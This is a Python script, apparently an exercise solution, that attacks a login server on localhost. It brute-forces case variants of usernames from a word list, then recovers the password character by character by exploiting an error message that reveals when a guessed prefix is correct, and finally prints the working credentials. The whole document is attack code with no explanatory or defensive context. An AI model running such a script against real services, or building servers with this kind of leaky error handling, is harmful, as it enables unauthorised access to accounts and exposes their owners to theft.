import json
import itertools
import sys
import socket
import string

log_pass = {
    "login": "admin",
    "password": " "
}

with open('logins.txt', 'r') as logins_file:
    logins = [x.strip('\n') for x in logins_file]

def connecting_to_server():
    correct_login, correct_password = '', ''
    connection = socket.socket()
    argv = sys.argv
    host, port = "localhost", 9090
    connection.connect((host, port))
    for i in brut_force_login(logins):
        log_pass['login'] = i
        # converts to json format and converts to bytes and  sends through socket
        connection.send(json.dumps(log_pass).encode())
        # 1024 are the maximum number of bytes and decodes from json into python dict                                          # to be received at once
        answer = json.loads(connection.recv(1024))
        if answer['result'] == 'Wrong password!':
            correct_login = log_pass['login']
            break
    for k in range(1_000_000):
        for i in brut_force_password():
            log_pass['password'] = correct_password + i
            connection.send(json.dumps(log_pass).encode())
            answer = json.loads(connection.recv(1024))
            if answer['result'] == 'Exception happened during login':
                correct_password = correct_password + i
            elif answer['result'] == 'Connection success!':
                log_pass['login'], log_pass['password'] = correct_login, correct_password + i
                print(json.dumps(log_pass))
                # print(correct_login, correct_password, i)
                exit()

    connection.close()


def brut_force_login(typical_login):
    for login in typical_login:
        all_logins = map(''.join, itertools.product(
            *((c.upper(), c.lower()) for c in login)))
        for x in all_logins:
            yield x


def brut_force_password():
    alphabet = string.digits + string.ascii_letters
    all_logins = itertools.product(alphabet)
    for x in all_logins:
        yield x[0]


connecting_to_server()
